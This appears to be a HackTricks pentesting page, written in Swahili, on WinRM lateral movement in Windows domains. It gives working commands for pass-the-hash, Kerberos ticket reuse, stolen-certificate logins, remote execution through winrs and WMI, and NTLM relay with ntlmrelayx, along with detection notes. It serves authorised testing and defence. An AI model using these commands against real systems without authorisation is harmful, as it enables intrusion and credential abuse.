# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM ni mojawapo ya njia rahisi zaidi za **lateral movement** katika mazingira ya Windows kwa sababu inakupa remote shell kupitia **WS-Man/HTTP(S)** bila kuhitaji mbinu za kuunda SMB service. Ikiwa lengo linaonesha **5985/5986** na principal yako inaruhusiwa kutumia remoting, mara nyingi unaweza kusonga kutoka "valid creds" hadi "interactive shell" haraka sana.

Kwa **protocol/service enumeration**, listeners, kuwezesha WinRM, `Invoke-Command`, na matumizi ya jumla ya client, angalia:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Kwa nini operators wanapenda WinRM

- Hutumia **HTTP/HTTPS** badala ya SMB/RPC, kwa hiyo mara nyingi hufanya kazi mahali ambapo utekelezaji wa aina ya PsExec unazuiwa.
- Kwa **Kerberos**, huepuka kutuma reusable credentials kwenda kwenye lengo.
- Hufanya kazi vizuri kutoka kwenye tooling za **Windows**, **Linux**, na **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Njia ya interactive PowerShell remoting huanzisha **`wsmprovhost.exe`** kwenye lengo chini ya context ya mtumiaji aliyeauthenticate, jambo ambalo kiutendaji ni tofauti na service-based exec.

## Access model na prerequisites

Kwa vitendo, WinRM lateral movement yenye mafanikio inategemea mambo **matatu**:

1. Lengo lina **WinRM listener** (`5985`/`5986`) na firewall rules zinazoruhusu access.
2. Account inaweza **authenticate** kwenye endpoint.
3. Account inaruhusiwa **kufungua remoting session**.

Njia za kawaida za kupata access hiyo:

- **Local Administrator** kwenye lengo.
- Uanachama katika **Remote Management Users** kwenye mifumo mipya au **WinRMRemoteWMIUsers__** kwenye mifumo/components ambazo bado zinaheshimu group hiyo.
- Remoting rights za moja kwa moja zilizo-delegate kupitia local security descriptors / PowerShell remoting ACL changes.

Ikiwa tayari unadhibiti box lenye admin rights, kumbuka unaweza pia **kudeligate WinRM access bila full admin group membership** kwa kutumia mbinu zilizoelezwa hapa:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas ambazo ni muhimu wakati wa lateral movement

- **Kerberos inahitaji hostname/FQDN**. Ukiunganisha kwa IP, client kawaida hurudi kwenye **NTLM/Negotiate**.
- Katika hali za **workgroup** au cross-trust edge cases, NTLM mara nyingi huhitaji ama **HTTPS** au target iongezwe kwenye **TrustedHosts** kwenye client.
- Kwa **local accounts** kupitia Negotiate katika workgroup, UAC remote restrictions zinaweza kuzuia access isipokuwa built-in Administrator account itumike au `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting kwa default hutumia **`HTTP/<host>` SPN**. Katika mazingira ambako `HTTP/<host>` tayari imesajiliwa kwa service account nyingine, WinRM Kerberos inaweza kushindwa kwa `0x80090322`; tumia port-qualified SPN au badilisha kwenda **`WSMAN/<host>`** pale SPN hiyo inapopatikana.

Ukipata valid credentials wakati wa password spraying, kuzithibitisha kupitia WinRM mara nyingi ni njia ya haraka zaidi ya kuangalia kama zinageuka kuwa shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec kwa validation na one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM kwa interactive shells

`evil-winrm` bado ni chaguo rahisi zaidi la interactive kutoka Linux kwa sababu inasaidia **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, file transfer, na in-memory PowerShell/.NET loading.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

Wakati default **`HTTP/<host>`** SPN inasababisha Kerberos failures, jaribu kuomba/kutumia ticket ya **`WSMAN/<host>`** badala yake. Hii huonekana katika hardened au odd enterprise setups ambapo `HTTP/<host>` tayari imeambatishwa kwenye service account nyingine.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Hii pia ni muhimu baada ya matumizi mabaya ya **RBCD / S4U** unapokuwa umeforge au umeomba hasa service ticket ya **WSMAN** badala ya generic `HTTP` ticket.

### Uthibitishaji unaotegemea certificate

WinRM pia inasaidia **client certificate authentication**, lakini certificate lazima iwe imewekwa kwenye target kwa **local account**. Kutoka kwenye mtazamo wa offensive, hii ni muhimu wakati:

- uliiba/uli-export client certificate halali na private key ambayo tayari ime-mapped kwa WinRM;
- ulitumia vibaya **AD CS / Pass-the-Certificate** kupata certificate kwa principal kisha uka pivot kwenda njia nyingine ya authentication;
- unafanya kazi katika environments zinazokwepa kwa makusudi password-based remoting.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM ni ya kawaida sana kuliko password/hash/Kerberos auth, lakini inapokuwepo inaweza kutoa njia ya **passwordless lateral movement** inayodumu hata baada ya password rotation.

### Python / automation with `pypsrp`

Ikiwa unahitaji automation badala ya operator shell, `pypsrp` hukupa WinRM/PSRP kutoka Python kwa usaidizi wa **NTLM**, **certificate auth**, **Kerberos**, na **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Uhamishaji wa upande wa Windows-native WinRM

### `winrs.exe`

`winrs.exe` imejengwa ndani na ni muhimu unapohitaji **utekelezaji wa amri wa native WinRM** bila kufungua kikao cha interactive PowerShell remoting:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Kiutendaji, `winrs.exe` mara nyingi husababisha mfuatano wa mchakato wa mbali unaofanana na:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Hili linastahili kukumbukwa kwa sababu linatofautiana na service-based exec na pia na interactive PSRP sessions.

### `winrm.cmd` / WS-Man COM badala ya PowerShell remoting

Unaweza pia kutekeleza kupitia **WinRM transport** bila `Enter-PSSession` kwa kuinvoke WMI classes kupitia WS-Man. Hii huweka transport kama WinRM huku remote execution primitive ikibadilika kuwa **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Utaratibu huo ni muhimu wakati:

- Ufuatiliaji wa PowerShell logging unafuatiliwa kwa ukali.
- Unataka **WinRM transport** lakini si classic PS remoting workflow.
- Unajenga au kutumia custom tooling karibu na **`WSMan.Automation`** COM object.

## NTLM relay to WinRM (WS-Man)

Wakati SMB relay imezuiwa na signing na LDAP relay imewekewa vizuizi, **WS-Man/WinRM** bado inaweza kuwa target ya relay inayovutia. `ntlmrelayx.py` ya kisasa inajumuisha **WinRM relay servers** na inaweza kufanya relay kwenda kwenye targets za **`wsman://`** au **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Vidokezo viwili vya vitendo:

- Relay huwa na manufaa zaidi wakati target inakubali **NTLM** na principal iliyorelayiwa inaruhusiwa kutumia WinRM.
- Msimbo wa hivi karibuni wa Impacket hushughulikia mahususi maombi ya **`WSMANIDENTIFY: unauthenticated`** ili probes za aina ya `Test-WSMan` zisivuruge mtiririko wa relay.

Kwa vikwazo vya multi-hop baada ya kupata session ya kwanza ya WinRM, angalia:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC na maelezo ya detection

- **Interactive PowerShell remoting** kwa kawaida huunda **`wsmprovhost.exe`** kwenye target.
- **`winrs.exe`** kwa kawaida huunda **`winrshost.exe`** na kisha child process iliyoombwa.
- Tarajia telemetry ya **network logon**, matukio ya WinRM service, na PowerShell operational/script-block logging ikiwa unatumia PSRP badala ya raw `cmd.exe`.
- Ukihitaji amri moja tu, `winrs.exe` au one-shot WinRM execution inaweza kuwa na kelele kidogo kuliko interactive remoting session ya muda mrefu.
- Ikiwa Kerberos inapatikana, pendelea **FQDN + Kerberos** badala ya IP + NTLM ili kupunguza matatizo ya trust na mabadiliko yasiyo ya kawaida ya `TrustedHosts` upande wa client.

## Marejeo

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
